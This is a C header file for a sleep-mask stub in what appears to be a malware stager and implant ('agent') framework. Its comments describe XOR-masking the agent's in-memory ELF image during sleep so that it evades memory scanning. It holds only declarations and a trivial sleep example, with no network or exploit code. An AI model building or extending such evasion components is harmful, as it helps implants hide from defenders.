#ifndef STAGER_MASK_H
#define STAGER_MASK_H

#include <stddef.h>
#include <stdint.h>

#include "stager_iface.h"

/*
 * Sleep-mask stub for the stager.
 *
 * The mask code lives in the stager mapping, not in the agent image, so it can
 * keep running while the agent image is XORed. The stager and agent share one
 * process, so no descriptor is needed: stager_mask_publish() places the entry
 * point in the GS state block the stager already installs, and the agent reads
 * it directly at startup. The agent must have stopped or joined every other
 * thread first: this function masks in place and does not suspend the caller.
 *
 * The agent passes an address inside its own ELF (a probe); the stub locates
 * the image through /proc/self/maps, makes its segments writable, XORs them
 * with a fresh random key, sleeps, restores them and returns.
 */
typedef int (*stager_mask_fn)(unsigned seconds, uintptr_t probe);

/* Publish the mask entry point in the stager state block (mask.c). */
void stager_mask_publish(void);

/*
 * Provider contract (mask_<name>.c, selected with MASK=<name>):
 * mask the image containing `probe`, sleep, and restore it. 0 on success.
 * The common wrapper in mask.c discards the spent payload blob first.
 *
 * A minimal provider can simply sleep:
 *
 *   int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe) {
 *     (void)probe;
 *     struct { long sec, nsec; } ts = {(long)seconds, 0};
 *     while (syscall2(SYS_nanosleep, (long)&ts, (long)&ts) == -4) {}
 *     return 0;
 *   }
 */
int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe);

#endif /* STAGER_MASK_H */
